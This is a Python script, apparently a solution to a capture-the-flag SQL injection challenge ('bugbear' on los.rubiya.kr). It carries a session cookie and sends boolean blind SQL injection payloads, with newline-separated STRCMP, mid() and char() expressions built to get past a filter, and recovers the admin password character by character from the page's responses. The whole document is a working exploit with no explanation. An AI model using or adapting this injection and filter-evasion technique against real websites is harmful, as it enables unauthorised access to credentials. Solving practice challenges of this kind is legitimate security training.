import requests

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookie = dict(PHPSESSID="2fe29pshtdqrc7jtiuetqrncb9")

pw = ""
for i in range(1,10):
    for j in range(40, 128):
        payload = f'1\n||\nSTRCMP(id,"admin")\nIS\nFALSE\n&&\nSTRCMP(mid(pw,{i},1),char({j}))\nIS\nFALSE'
        response = requests.get(url, cookies=cookie, params={"no":payload})
        if "Hello admin" in response.text:
            print(j)
            pw += chr(j)
            break
    else :
        print("fin")
        break

print(pw)
